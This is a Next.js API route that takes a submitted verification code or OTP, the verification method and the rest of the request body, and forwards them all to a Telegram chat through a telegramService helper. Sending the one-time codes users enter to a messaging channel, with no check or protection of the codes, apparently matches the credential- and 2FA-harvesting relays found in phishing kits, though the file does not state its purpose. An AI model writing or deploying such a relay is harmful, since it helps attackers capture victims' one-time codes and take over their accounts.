import { NextRequest, NextResponse } from "next/server"
import { telegramService } from "@/lib/telegram"

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const code =
      (typeof body.code === "string" && body.code) ||
      (typeof body.otp === "string" && body.otp) ||
      ""
    const verificationType =
      (typeof body.verificationType === "string" && body.verificationType) ||
      (typeof body.method === "string" && body.method) ||
      undefined
    await telegramService.sendVerificationNotification({
      ...body,
      code,
      verificationType,
    })
    return NextResponse.json({ success: true })
  } catch (error) {
    console.error("Error sending verification notification:", error)
    return NextResponse.json({ error: "Failed to send notification" }, { status: 500 })
  }
}
